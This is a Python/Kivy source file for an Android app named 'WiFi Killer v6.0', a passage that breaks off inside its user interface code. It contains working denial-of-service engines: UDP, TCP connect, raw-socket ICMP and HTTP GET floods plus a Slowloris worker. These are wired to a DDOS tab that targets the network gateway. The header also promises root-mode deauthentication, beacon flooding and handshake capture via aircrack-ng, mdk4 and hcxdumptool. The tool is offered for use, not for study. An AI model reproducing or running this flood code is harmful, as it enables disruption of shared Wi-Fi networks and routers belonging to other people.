# language: Python 3, file: main.py, runtime: Kivy 2.3+ / Android API 23+
# WiFi Killer v6.0 — NETACT × BOWOgaming Edition
# NON-ROOT MODE: WifiManager API, pyjnius bridge
# ROOT MODE: aircrack-ng + mdk4 + hcxdumptool auto-unlock
# NEW v6.0: DDOS engine (UDP/TCP/ICMP/HTTP flood), Beacon Flood, MDK4 storm,
#           Channel Hopper, Throttle Buster scan, Signal Tracker

import os, re, time, threading, subprocess, socket, random, struct
from functools import partial

from kivy.app            import App
from kivy.uix.boxlayout  import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label      import Label
from kivy.uix.button     import Button
from kivy.uix.textinput  import TextInput
from kivy.uix.scrollview import ScrollView
from kivy.uix.slider     import Slider
from kivy.uix.spinner    import Spinner
from kivy.uix.widget     import Widget
from kivy.uix.togglebutton import ToggleButton
from kivy.uix.progressbar  import ProgressBar
from kivy.graphics       import (Color, Rectangle, RoundedRectangle,
                                  Ellipse, Line)
from kivy.core.window    import Window
from kivy.clock          import Clock
from kivy.animation      import Animation
from kivy.utils          import get_color_from_hex as hx

# ── window ──────────────────────────────────────────────────────────────────────
Window.clearcolor = hx('#090b10')

# ── palette ─────────────────────────────────────────────────────────────────────
C_BG0    = hx('#090b10')
C_BG1    = hx('#0d1018')
C_BG2    = hx('#131822')
C_TEAL   = hx('#3cf0dc')
C_BLUE   = hx('#4e8cff')
C_GOLD   = hx('#f5c542')
C_RED    = hx('#ff3c5a')
C_ORANGE = hx('#ff8c3c')
C_GREEN  = hx('#3cffa0')
C_PURPLE = hx('#c084fc')
C_MUTED  = hx('#4a5568')
C_TEXT   = hx('#c8d4e8')

# ── platform detection ───────────────────────────────────────────────────────────
IS_ANDROID = False
IS_ROOT    = False

try:
    from android.permissions import (request_permissions, Permission,
                                      check_permission)
    IS_ANDROID = True
except ImportError:
    pass

def _check_root():
    global IS_ROOT
    try:
        r = subprocess.run(['su', '-c', 'id'],
                           capture_output=True, text=True, timeout=3)
        IS_ROOT = 'uid=0' in r.stdout
    except Exception:
        IS_ROOT = False

threading.Thread(target=_check_root, daemon=True).start()

# ── Android Java bridge ──────────────────────────────────────────────────────────
WifiManager     = None
ConnManager     = None
wifi_mgr        = None
conn_mgr        = None
android_context = None

def _init_android_apis():
    global WifiManager, ConnManager, wifi_mgr, conn_mgr, android_context
    if not IS_ANDROID:
        return
    try:
        from jnius import autoclass, cast
        PythonActivity  = autoclass('org.kivy.android.PythonActivity')
        Context         = autoclass('android.content.Context')
        android_context = PythonActivity.mActivity

        WifiManager = autoclass('android.net.wifi.WifiManager')
        wifi_mgr    = cast('android.net.wifi.WifiManager',
                           android_context.getSystemService(Context.WIFI_SERVICE))

        ConnManager = autoclass('android.net.ConnectivityManager')
        conn_mgr    = cast('android.net.ConnectivityManager',
                           android_context.getSystemService(Context.CONNECTIVITY_SERVICE))
    except Exception as e:
        print(f'[jnius] init failed: {e}')

# ── Wi-Fi helpers — non-root ─────────────────────────────────────────────────────
def wifi_enable(state: bool):
    if wifi_mgr:
        try:
            wifi_mgr.setWifiEnabled(state)
        except Exception:
            pass

def wifi_start_scan() -> bool:
    if wifi_mgr:
        try:
            return wifi_mgr.startScan()
        except Exception:
            return False
    return False

def wifi_get_results() -> list:
    results = []
    if not wifi_mgr:
        return results
    try:
        scan_list = wifi_mgr.getScanResults()
        for i in range(scan_list.size()):
            ap = scan_list.get(i)
            freq = ap.frequency
            if 2412 <= freq <= 2484:
                ch = int((freq - 2407) / 5)
            elif 5000 <= freq <= 5900:
                ch = int((freq - 5000) / 5)
            else:
                ch = 0
            caps = ap.capabilities or ''
            enc  = ('WPA3' if 'SAE'  in caps else
                    'WPA2' if 'WPA2' in caps else
                    'WPA'  if 'WPA'  in caps else
                    'WEP'  if 'WEP'  in caps else
                    'OPEN')
            results.append({
                'ssid'  : ap.SSID or '<hidden>',
                'bssid' : ap.BSSID or '',
                'pwr'   : str(ap.level),
                'ch'    : str(ch),
                'freq'  : str(freq),
                'enc'   : enc,
                'caps'  : caps,
            })
        results.sort(key=lambda x: int(x['pwr']), reverse=True)
    except Exception as e:
        print(f'[scan] error: {e}')
    return results

def wifi_get_current() -> dict:
    info = {'ssid': '', 'bssid': '', 'ip': '', 'rssi': '', 'link_speed': '', 'mac': ''}
    if not wifi_mgr:
        return info
    try:
        wi = wifi_mgr.getConnectionInfo()
        ssid = wi.getSSID() or ''
        ssid = ssid.strip('"')
        info['ssid']       = ssid
        info['bssid']      = wi.getBSSID() or ''
        info['rssi']       = str(wi.getRssi())
        info['link_speed'] = str(wi.getLinkSpeed())
        ip_int = wi.getIpAddress()
        info['ip'] = (f'{ip_int & 0xFF}.{(ip_int>>8)&0xFF}.'
                      f'{(ip_int>>16)&0xFF}.{(ip_int>>24)&0xFF}')
        info['mac']        = wi.getMacAddress() or ''
    except Exception as e:
        print(f'[conninfo] {e}')
    return info

def wifi_disconnect():
    if wifi_mgr:
        try:
            wifi_mgr.disconnect()
            return True
        except Exception:
            return False
    return False

def wifi_reconnect():
    if wifi_mgr:
        try:
            wifi_mgr.reconnect()
            return True
        except Exception:
            return False
    return False

def wifi_forget_network(network_id: int):
    if wifi_mgr:
        try:
            wifi_mgr.removeNetwork(network_id)
            wifi_mgr.saveConfiguration()
            return True
        except Exception:
            return False
    return False

def wifi_get_saved_networks() -> list:
    nets = []
    if not wifi_mgr:
        return nets
    try:
        configured = wifi_mgr.getConfiguredNetworks()
        for i in range(configured.size()):
            n = configured.get(i)
            ssid = (n.SSID or '').strip('"')
            nets.append({'id': n.networkId, 'ssid': ssid})
    except Exception as e:
        print(f'[saved] {e}')
    return nets

def get_gateway_ip(current_ip: str) -> str:
    """Derive gateway dari IP perangkat (asumsi .1 atau .254)."""
    if not current_ip or current_ip == '0.0.0.0':
        return ''
    parts = current_ip.split('.')
    if len(parts) == 4:
        return f'{parts[0]}.{parts[1]}.{parts[2]}.1'
    return ''

# ── root helpers ─────────────────────────────────────────────────────────────────
def root_run(cmd, timeout=30):
    if not IS_ROOT:
        return '[no root]'
    try:
        r = subprocess.run(['su', '-c', cmd],
                           capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return '[timeout]'
    except Exception as e:
        return f'[error] {e}'

def root_popen(cmd):
    return subprocess.Popen(['su', '-c', cmd],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# ── DDOS flood engines ───────────────────────────────────────────────────────────

def _udp_flood_worker(target_ip: str, target_port: int, stop_event: threading.Event,
                       counter: list, size: int = 1024):
    """UDP flood — saturasi bandwidth ke gateway/AP."""
    payload = os.urandom(size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
            counter[0] += 1
        except Exception:
            time.sleep(0.001)
    sock.close()

def _tcp_syn_flood_worker(target_ip: str, target_port: int, stop_event: threading.Event,
                           counter: list):
    """TCP connect flood — exhausts connection table of AP/router."""
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((target_ip, target_port))
            s.close()
            counter[0] += 1
        except Exception:
            pass

def _icmp_flood_worker(target_ip: str, stop_event: threading.Event,
                        counter: list):
    """ICMP echo flood — ping storm ke router. Butuh raw socket (root/privileged)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        # Fallback ke UDP jika raw socket tidak tersedia
        _udp_flood_worker(target_ip, 7, stop_event, counter)
        return

    def _checksum(data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i+1]
            else:
                s += data[i]
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    seq = 0
    while not stop_event.is_set():
        try:
            header = struct.pack('!BBHHH', 8, 0, 0, random.randint(1,65535), seq)
            payload = b'X' * 56
            chk = _checksum(header + payload)
            header = struct.pack('!BBHHH', 8, 0, chk, random.randint(1,65535), seq)
            sock.sendto(header + payload, (target_ip, 0))
            counter[0] += 1
            seq = (seq + 1) & 0xffff
        except Exception:
            time.sleep(0.001)
    sock.close()

def _http_flood_worker(target_ip: str, target_port: int, stop_event: threading.Event,
                        counter: list):
    """HTTP GET flood ke web interface router (biasanya port 80/8080)."""
    paths = ['/', '/index.html', '/login', '/admin', '/status', '/api/info']
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36',
        'curl/7.88.1',
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((target_ip, target_port))
            path = random.choice(paths)
            agent = random.choice(agents)
            req = (f'GET {path} HTTP/1.1\r\n'
                   f'Host: {target_ip}\r\n'
                   f'User-Agent: {agent}\r\n'
                   f'Connection: keep-alive\r\n'
                   f'Cache-Control: no-cache\r\n\r\n').encode()
            s.sendall(req)
            s.recv(512)
            s.close()
            counter[0] += 1
        except Exception:
            pass

def _slowloris_worker(target_ip: str, target_port: int, stop_event: threading.Event,
                       counter: list, n_sockets: int = 50):
    """Slowloris — buka banyak koneksi, kirim header sangat lambat, kuras thread pool router."""
    sockets = []

    def _open_sock():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f'GET / HTTP/1.1\r\nHost: {target_ip}\r\n'.encode())
            return s
        except Exception:
            return None

    # init pool
    for _ in range(n_sockets):
        s = _open_sock()
        if s:
            sockets.append(s)

    while not stop_event.is_set():
        for s in list(sockets):
            try:
                s.send(f'X-a: {random.randint(1,9999)}\r\n'.encode())
                counter[0] += 1
            except Exception:
                sockets.remove(s)
        # refill
        while len(sockets) < n_sockets and not stop_event.is_set():
            s = _open_sock()
            if s:
                sockets.append(s)
        time.sleep(5)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

# ── signal helpers ───────────────────────────────────────────────────────────────
def pwr_to_color(s):
    try:
        v = int(s)
    except (TypeError, ValueError):
        return C_MUTED
    if v >= -50: return C_GREEN
    if v >= -70: return C_TEAL
    if v >= -80: return C_GOLD
    return C_RED

def fmt_pwr_bar(pwr_str):
    try:
        v = int(pwr_str)
    except (TypeError, ValueError):
        return ('░░░░░', 0.0)
    ratio  = max(0.0, min(1.0, (v + 100) / 70.0))
    filled = int(ratio * 5)
    return ('█' * filled + '░' * (5 - filled), ratio)

def signal_quality(pwr_str) -> str:
    try:
        v = int(pwr_str)
    except (TypeError, ValueError):
        return '?'
    if v >= -50: return 'EXCELLENT'
    if v >= -60: return 'GOOD'
    if v >= -70: return 'FAIR'
    if v >= -80: return 'WEAK'
    return 'POOR'

def fmt_pps(n: int) -> str:
    if n >= 1_000_000: return f'{n/1_000_000:.1f}M'
    if n >= 1_000:     return f'{n/1_000:.1f}K'
    return str(n)

# ── UI widgets ──────────────────────────────────────────────────────────────────
class PulseDot(Widget):
    def __init__(self, color=None, size_hint=(None, None), size=(14, 14), **kw):
        super().__init__(size_hint=size_hint, size=size, **kw)
        self._c = color or C_TEAL
        with self.canvas:
            self._col = Color(*self._c[:3], 1.0)
            self._dot = Ellipse(pos=self.pos, size=self.size)
        self.bind(pos=self._redraw, size=self._redraw)
        Clock.schedule_interval(self._pulse, 0.05)
        self._t = 0.0

    def _pulse(self, dt):
        import math
        self._t += dt
        a = 0.5 + 0.5 * math.sin(self._t * 3.0)
        self._col.rgba = (*self._c[:3], a)

    def _redraw(self, *a):
        self._dot.pos  = self.pos
        self._dot.size = self.size

    def set_color(self, c):
        self._c = c


class GlowCard(BoxLayout):
    def __init__(self, bg=None, radius=12, **kw):
        super().__init__(**kw)
        c = bg or C_BG1
        with self.canvas.before:
            Color(*C_TEAL[:3], 0.15)
            self._border = RoundedRectangle(
                pos=(self.x-1, self.y-1),
                size=(self.width+2, self.height+2),
                radius=[radius+1])
            Color(*c)
            self._bg = RoundedRectangle(pos=self.pos, size=self.size,
                                         radius=[radius])
        self.bind(pos=self._redraw, size=self._redraw)

    def _redraw(self, *a):
        self._bg.pos      = self.pos
        self._bg.size     = self.size
        self._border.pos  = (self.x-1, self.y-1)
        self._border.size = (self.width+2, self.height+2)


class GlowCardRed(GlowCard):
    def __init__(self, **kw):
        super().__init__(**kw)
        with self.canvas.before:
            Color(*C_RED[:3], 0.12)
            self._border_r = RoundedRectangle(
                pos=(self.x-1, self.y-1),
                size=(self.width+2, self.height+2),
                radius=[13])
        self.bind(pos=lambda *a: setattr(self._border_r, 'pos', (self.x-1, self.y-1)),
                  size=lambda *a: setattr(self._border_r, 'size', (self.width+2, self.height+2)))


class TabBtn(Button):
    def __init__(self, active=False, **kw):
        super().__init__(**kw)
        self.background_normal = ''
        self.background_down   = ''
        self.set_active(active)

    def set_active(self, v):
        if v:
            self.background_color = (*C_TEAL[:3], 0.15)
            self.color = C_TEAL
        else:
            self.background_color = (*C_BG2[:3], 1.0)
            self.color = C_MUTED


class StatTile(GlowCard):
    def __init__(self, label, init_val='—', vc=None, **kw):
        kw.setdefault('orientation', 'vertical')
        kw.setdefault('size_hint_y', None)
        kw.setdefault('height', 58)
        kw.setdefault('padding', [8, 4])
        super().__init__(**kw)
        self.vc  = vc or C_TEAL
        self.val = Label(text=str(init_val), font_size='16sp', bold=True,
                         color=self.vc)
        self.key = Label(text=label, font_size='8sp', color=C_MUTED)
        self.add_widget(self.val)
        self.add_widget(self.key)

    def update(self, value, color=None):
        def _do(*a):
            old = self.val.text
            self.val.text = str(value)
            if color:
                self.val.color = color
            if old != str(value):
                anim = (Animation(font_size='20sp', duration=0.08) +
                        Animation(font_size='16sp', duration=0.12))
                anim.start(self.val)
        Clock.schedule_once(_do, 0)


class HRule(Widget):
    def __init__(self, color=None, **kw):
        kw.setdefault('size_hint_y', None)
        kw.setdefault('height', 1)
        super().__init__(**kw)
        c = color or (*C_TEAL[:3], 0.18)
        with self.canvas:
            Color(*c)
            self._l = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *a: setattr(self._l, 'pos', self.pos),
                  size=lambda *a: setattr(self._l, 'size', self.size))


class Watermark(Label):
    def __init__(self, **kw):
        super().__init__(
            text='dibuat oleh NETACT dan BOWOgaming  |  v6.0 non-root',
            font_size='8sp',
            color=(*C_TEAL[:3], 0.40),
            size_hint_y=None,
            height=14,
            halign='center',
            **kw)


class APRow(BoxLayout):
    def __init__(self, ap, on_pick, **kw):
        kw.setdefault('size_hint_y', None)
        kw.setdefault('height', 50)
        kw.setdefault('spacing', 4)
        kw.setdefault('padding', [10, 2])
        super().__init__(**kw)
        with self.canvas.before:
            Color(*C_BG2)
            self._r = RoundedRectangle(pos=self.pos, size=self.size, radius=[6])
        self.bind(pos=lambda *a: setattr(self._r, 'pos', self.pos),
                  size=lambda *a: setattr(self._r, 'size', self.size))

        ssid   = (ap['ssid'] or '<hidden>')[:14]
        bssid  = ap['bssid']
        ch     = ap['ch'].rjust(2)
        pc     = pwr_to_color(ap['pwr'])
        bar, _ = fmt_pwr_bar(ap['pwr'])
        qual   = signal_quality(ap['pwr'])
        enc    = ap['enc']

        col_left = BoxLayout(orientation='vertical', size_hint_x=0.30)
        col_left.add_widget(Label(text=ssid, font_size='11sp', bold=True,
                                   color=C_TEXT, halign='left'))
        col_left.add_widget(Label(text=bssid, font_size='8sp', color=C_MUTED,
                                   halign='left'))
        self.add_widget(col_left)

        self.add_widget(Label(text=f'ch{ch}', font_size='10sp', color=C_BLUE,
                               size_hint_x=0.10))
        self.add_widget(Label(text=bar, font_size='10sp', color=pc,
                               size_hint_x=0.14))

        col_right = BoxLayout(orientation='vertical', size_hint_x=0.22)
        col_right.add_widget(Label(text=enc, font_size='9sp', color=C_GOLD))
        col_right.add_widget(Label(text=qual, font_size='7sp', color=pc))
        self.add_widget(col_right)

        sel = Button(text='◎', font_size='16sp', size_hint_x=None, width=36,
                     background_normal='', background_color=(0,0,0,0),
                     color=C_TEAL)
        sel.bind(on_press=lambda *x: on_pick(ap))
        self.add_widget(sel)


class SavedNetRow(BoxLayout):
    def __init__(self, net, on_forget, **kw):
        kw.setdefault('size_hint_y', None)
        kw.setdefault('height', 42)
        kw.setdefault('spacing', 6)
        kw.setdefault('padding', [10, 2])
        super().__init__(**kw)
        with self.canvas.before:
            Color(*C_BG2)
            self._r = RoundedRectangle(pos=self.pos, size=self.size, radius=[6])
        self.bind(pos=lambda *a: setattr(self._r, 'pos', self.pos),
                  size=lambda *a: setattr(self._r, 'size', self.size))
        self.add_widget(Label(text=net['ssid'] or '<no ssid>', font_size='11sp',
                               color=C_TEXT, halign='left'))
        self.add_widget(Label(text=f'id:{net["id"]}', font_size='9sp',
                               color=C_MUTED, size_hint_x=0.20))
        del_btn = Button(text='✕ FORGET', font_size='9sp', bold=True,
                         size_hint_x=None, width=72,
                         background_normal='', background_color=(*C_RED[:3], 0.2),
                         color=C_RED)
        del_btn.bind(on_press=lambda *x: on_forget(net))
        self.add_widget(del_btn)


# ── header ──────────────────────────────────────────────────────────────────────
class HeaderBar(BoxLayout):
    def __init__(self, root_ref, **kw):
        kw.setdefault('size_hint_y', None)
        kw.setdefault('height', 56)
        kw.setdefault('padding', [12, 0])
        kw.setdefault('spacing', 8)
        super().__init__(**kw)
        with self.canvas.before:
            Color(*hx('#0d1220'))
            self._bg = Rectangle(pos=self.pos, size=self.size)
            Color(*C_TEAL[:3], 0.12)
            self._glow = Rectangle(pos=(self.x, self.y), size=(self.width, 2))
        self.bind(pos=self._redraw, size=self._redraw)

        self.root_dot = PulseDot(color=C_MUTED)
        self.add_widget(self.root_dot)

        title_col = BoxLayout(orientation='vertical', size_hint_x=None, width=180)
        title_col.add_widget(Label(text='WiFi Killer', font_size='17sp', bold=True,
                                    color=C_TEXT, size_hint_y=0.6))
        self._sub = Label(text='v6.0  NETACT × BOWOgaming  |  Non-Root',
                           font_size='8sp', color=C_MUTED, size_hint_y=0.4)
        title_col.add_widget(self._sub)
        self.add_widget(title_col)
        self.add_widget(Widget())

        self.wifi_btn = Button(
            text='Wi-Fi', font_size='10sp', bold=True,
            size_hint=(None, None), size=(60, 30),
            background_normal='', background_color=(*C_BG2[:3], 1),
            color=C_MUTED)
        self.wifi_btn.bind(on_press=root_ref._toggle_wifi)
        self.add_widget(self.wifi_btn)

    def _redraw(self, *a):
        self._bg.pos    = self.pos
        self._bg.size   = self.size
        self._glow.pos  = (self.x, self.y + self.height - 1)
        self._glow.size = (self.width, 1)

    def set_root_mode(self, has_root: bool):
        if has_root:
            self._sub.text  = 'v6.0  NETACT × BOWOgaming  |  ROOT ✓'
            self._sub.color = C_TEAL
            self.root_dot.set_color(C_TEAL)
        else:
            self._sub.text  = 'v6.0  NETACT × BOWOgaming  |  Non-Root'
            self._sub.color = C_MUTED
            self.root_dot.set_color(C_GOLD)


# ── background ──────────────────────────────────────────────────────────────────
class AetherBG(Widget):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.bind(pos=self._build, size=self._build)

    def _build(self, *a):
        self.canvas.before.clear()
        w, h = self.size
        with self.canvas.before:
            Color(*hx('#090b10'))
            Rectangle(pos=self.pos, size=self.size)
            Color(*C_TEAL[:3], 0.04)
            Ellipse(pos=(w*0.5, h*0.55), size=(w*0.8, h*0.5))
            Color(*C_BLUE[:3], 0.05)
            Ellipse(pos=(-w*0.1, -h*0.1), size=(w*0.55, h*0.4))
            Color(*C_RED[:3], 0.03)
            Ellipse(pos=(-w*0.15, h*0.7), size=(w*0.4, h*0.3))
            Color(*C_TEAL[:3], 0.06)
            for i in range(0, int(h), 60):
                Line(points=[self.x, self.y+i,
                              self.x+w*0.3, self.y+i+h*0.08], width=0.5)


# ── main root layout ─────────────────────────────────────────────────────────────
class WiFiKillerRoot(FloatLayout):
    def __init__(self, **kw):
        super().__init__(**kw)

        # state
        self._ap_list        = []
        self._saved_nets     = []
        self._selected_ap    = None
        self._scanning       = False
        self._scan_count     = 0
        self._mode           = 'scan'
        self._wifi_enabled   = True
        self._spam_running   = False
        self._spam_thread    = None
        self._ddos_running   = False
        self._ddos_stop      = threading.Event()
        self._ddos_workers   = []
        self._ddos_counter   = [0]
        self._ddos_pps_prev  = 0
        self._signal_track   = {}
        self._ch_hop_running = False
        self._ch_hop_thread  = None

        self.add_widget(AetherBG(size_hint=(1,1), pos=(0,0)))

        main = BoxLayout(orientation='vertical', size_hint=(1,1))
        self.add_widget(main)

        self._hdr = HeaderBar(self)
        main.add_widget(self._hdr)
        main.add_widget(self._build_stat_bar())
        main.add_widget(self._build_tabs())
        main.add_widget(self._build_scroll())
        main.add_widget(self._build_footer())

        self._log('[init] WiFi Killer v6.0 — Non-Root + DDOS Engine', 'ok')
        threading.Thread(target=self._boot, daemon=True).start()

    # ── stat bar ─────────────────────────────────────────────────────────────
    def _build_stat_bar(self):
        bar = GridLayout(cols=5, size_hint_y=None, height=62,
                          spacing=4, padding=[8,4])
        with bar.canvas.before:
            Color(*C_BG0)
            r = Rectangle(pos=bar.pos, size=bar.size)
        bar.bind(pos=lambda *a: setattr(r, 'pos', bar.pos),
                 size=lambda *a: setattr(r, 'size', bar.size))
        self.st_aps    = StatTile('APs FOUND', '0',    C_TEAL)
        self.st_ch     = StatTile('CHANNEL',   '—',    C_BLUE)
        self.st_enc    = StatTile('ENC',        '—',    C_GOLD)
        self.st_pps    = StatTile('PKT/s',      '0',    C_RED)
        self.st_status = StatTile('STATUS',    'IDLE', C_MUTED)
        for w in (self.st_aps, self.st_ch, self.st_enc, self.st_pps, self.st_status):
            bar.add_widget(w)
        return bar

    # ── tabs ──────────────────────────────────────────────────────────────────
    def _build_tabs(self):
        bar = GridLayout(cols=6, size_hint_y=None, height=38,
                          spacing=2, padding=[6,2])
        with bar.canvas.before:
            Color(*C_BG0)
            r = Rectangle(pos=bar.pos, size=bar.size)
        bar.bind(pos=lambda *a: setattr(r,'pos',bar.pos),
                 size=lambda *a: setattr(r,'size',bar.size))
        self._tabs = {}
        tabs = [('scan','◈ SCAN'), ('info','◐ INFO'),
                ('saved','⬡ SAVED'), ('spam','⚡ SPAM'),
                ('ddos','☠ DDOS'), ('root','⚒ ROOT')]
        for key, txt in tabs:
            b = TabBtn(text=txt, font_size='9sp', active=(key=='scan'))
            b.bind(on_press=lambda x, k=key: self._switch_tab(k))
            self._tabs[key] = b
            bar.add_widget(b)
        return bar

    # ── scroll body ───────────────────────────────────────────────────────────
    def _build_scroll(self):
        self._scroll = ScrollView(size_hint=(1,1))
        self._body   = BoxLayout(orientation='vertical', size_hint_y=None,
                                  spacing=8, padding=[8,6,8,6])
        self._body.bind(minimum_height=self._body.setter('height'))
        self._scroll.add_widget(self._body)

        self._make_scan_panel()
        self._make_info_panel()
        self._make_saved_panel()
        self._make_spam_panel()
        self._make_ddos_panel()
        self._make_root_panel()
        self._make_log_panel()
        self._switch_tab('scan')
        return self._scroll

    # ── SCAN panel ────────────────────────────────────────────────────────────
    def _make_scan_panel(self):
        self._scan_panel = BoxLayout(orientation='vertical',
                                      size_hint_y=None, height=400, spacing=6)
        hdr = GridLayout(cols=6, size_hint_y=None, height=20, padding=[10,0])
        for txt, sx in [('SSID',0.30),('BSSID',0.28),('CH',0.10),
                         ('SIG',0.14),('ENC/QUAL',0.18),('',[None])]:
            kw = {'size_hint_x': sx} if sx != [None] else \
                 {'size_hint_x': None, 'width': 36}
            hdr.add_widget(Label(text=txt, font_size='8sp', color=C_MUTED, **kw))
        self._scan_panel.add_widget(hdr)
        self._scan_panel.add_widget(HRule())

        self._ap_scroll = ScrollView(size_hint_y=None, height=280)
        self._ap_table  = BoxLayout(orientation='vertical', size_hint_y=None,
                                     spacing=2)
        self._ap_table.bind(minimum_height=self._ap_table.setter('height'))
        self._ap_scroll.add_widget(self._ap_table)
        self._scan_panel.add_widget(self._ap_scroll)

        brow = BoxLayout(size_hint_y=None, height=44, spacing=6)
        self._scan_btn = Button(
            text='▶  START SCAN', font_size='12sp', bold=True,
            background_normal='', background_color=(*hx('#0a2015')[:3],1),
            color=C_TEAL)
        self._scan_btn.bind(on_press=self._toggle_scan)

        self._burst_btn = Button(
            text='⚡ BURST', font_size='11sp', bold=True,
            size_hint_x=None, width=80,
            background_normal='', background_color=(*hx('#1a1000')[:3],1),
            color=C_GOLD)
        self._burst_btn.bind(on_press=self._burst_scan)

        self._filter_inp = TextInput(
            hint_text='Filter SSID...', multiline=False,
            background_color=(*C_BG0[:3],1), foreground_color=C_TEXT,
            hint_text_color=C_MUTED, font_size='11sp', cursor_color=C_TEAL,
            size_hint_x=0.35)
        self._filter_inp.bind(text=self._apply_filter)

        brow.add_widget(self._scan_btn)
        brow.add_widget(self._burst_btn)
        brow.add_widget(self._filter_inp)
        self._scan_panel.add_widget(brow)

        # signal tracker toggle
        trk_row = BoxLayout(size_hint_y=None, height=30, spacing=8)
        trk_row.add_widget(Label(text='Signal Tracker', font_size='9sp',
                                   color=C_MUTED, size_hint_x=0.5))
        self._trk_btn = Button(text='OFF', font_size='9sp',
                                background_normal='',
                                background_color=(*C_BG2[:3],1), color=C_MUTED,
                                size_hint_x=0.5)
        self._trk_btn.bind(on_press=self._toggle_tracker)
        self._trk_running = False
        trk_row.add_widget(self._trk_btn)
        self._scan_panel.add_widget(trk_row)

    # ── INFO panel ────────────────────────────────────────────────────────────
    def _make_info_panel(self):
        self._info_panel = GlowCard(orientation='vertical',
                                     size_hint_y=None, height=320,
                                     spacing=10, padding=[14,12])
        self._info_panel.add_widget(Label(
            text='KONEKSI AKTIF', font_size='10sp', bold=True,
            color=C_TEAL, size_hint_y=None, height=18, halign='left'))
        self._info_panel.add_widget(HRule())

        rows = [
            ('SSID',       'info_ssid',      C_TEXT),
            ('BSSID',      'info_bssid',     C_MUTED),
            ('IP Address', 'info_ip',        C_BLUE),
            ('Gateway',    'info_gw',        C_ORANGE),
            ('Signal',     'info_rssi',      C_GREEN),
            ('Link Speed', 'info_speed',     C_GOLD),
            ('MAC',        'info_mac',       C_PURPLE),
        ]
        for label, attr, color in rows:
            row = BoxLayout(size_hint_y=None, height=28, spacing=8)
            row.add_widget(Label(text=label, font_size='9sp', color=C_MUTED,
                                  size_hint_x=0.35))
            lbl = Label(text='—', font_size='11sp', bold=True, color=color,
                         size_hint_x=0.65, halign='left')
            lbl.bind(size=lbl.setter('text_size'))
            setattr(self, attr, lbl)
            row.add_widget(lbl)
            self._info_panel.add_widget(row)

        self._info_panel.add_widget(HRule())

        brow = BoxLayout(size_hint_y=None, height=44, spacing=8)
        refresh_btn = Button(
            text='↺ REFRESH', font_size='11sp',
            background_normal='', background_color=(*C_BG2[:3],1), color=C_TEAL)
        refresh_btn.bind(on_press=lambda *a: self._refresh_info())

        disco_btn = Button(
            text='✕ DISCONNECT', font_size='11sp', bold=True,
            background_normal='', background_color=(*hx('#1a0010')[:3],1),
            color=C_RED)
        disco_btn.bind(on_press=self._do_disconnect)

        reconn_btn = Button(
            text='↩ RECONNECT', font_size='11sp',
            background_normal='', background_color=(*hx('#001a10')[:3],1),
            color=C_GREEN)
        reconn_btn.bind(on_press=self._do_reconnect)

        brow.add_widget(refresh_btn)
        brow.add_widget(disco_btn)
        brow.add_widget(reconn_btn)
        self._info_panel.add_widget(brow)

        # copy-IP button
        copy_row = BoxLayout(size_hint_y=None, height=34, spacing=8)
        copy_gw = Button(text='📋 COPY GW → DDOS TARGET', font_size='9sp',
                          background_normal='', background_color=(*hx('#100a1a')[:3],1),
                          color=C_PURPLE)
        copy_gw.bind(on_press=self._copy_gw_to_ddos)
        copy_row.add_widget(copy_gw)
        self._info_panel.add_widget(copy_row)

    # ── SAVED panel ───────────────────────────────────────────────────────────
    def _make_saved_panel(self):
        self._saved_panel = BoxLayout(orientation='vertical',
                                       size_hint_y=None, height=310, spacing=6)
        self._saved_panel.add_widget(Label(
            text='JARINGAN TERSIMPAN  —  tap ✕ untuk FORGET',
            font_size='9sp', color=C_MUTED,
            size_hint_y=None, height=18, halign='left'))
        self._saved_panel.add_widget(HRule())

        self._saved_scroll = ScrollView(size_hint_y=None, height=220)
        self._saved_table  = BoxLayout(orientation='vertical', size_hint_y=None,
                                        spacing=3)
        self._saved_table.bind(minimum_height=self._saved_table.setter('height'))
        self._saved_scroll.add_widget(self._saved_table)
        self._saved_panel.add_widget(self._saved_scroll)

        brow = BoxLayout(size_hint_y=None, height=44, spacing=8)
        load_btn = Button(
            text='↺ LOAD LIST', font_size='11sp',
            background_normal='', background_color=(*C_BG2[:3],1), color=C_TEAL)
        load_btn.bind(on_press=lambda *a: self._load_saved())

        forget_all = Button(
            text='✕ FORGET ALL', font_size='11sp', bold=True,
            background_normal='', background_color=(*hx('#1a0010')[:3],1),
            color=C_RED)
        forget_all.bind(on_press=self._forget_all)

        brow.add_widget(load_btn)
        brow.add_widget(forget_all)
        self._saved_panel.add_widget(brow)

    # ── SPAM panel ────────────────────────────────────────────────────────────
    def _make_spam_panel(self):
        self._spam_panel = GlowCard(orientation='vertical',
                                     size_hint_y=None, height=360,
                                     spacing=8, padding=[12,10])
        self._spam_panel.add_widget(Label(
            text='SPAM / DEAUTH ATTACK', font_size='10sp', bold=True,
            color=C_RED, size_hint_y=None, height=18, halign='left'))

        # mode pills
        mode_row = BoxLayout(size_hint_y=None, height=34, spacing=4)
        self._spam_btns = {}
        for key, txt in [('disco',  '↩ DISCO'),
                          ('auth',   '◈ AUTH'),
                          ('deauth', '⚡ DEAUTH'),
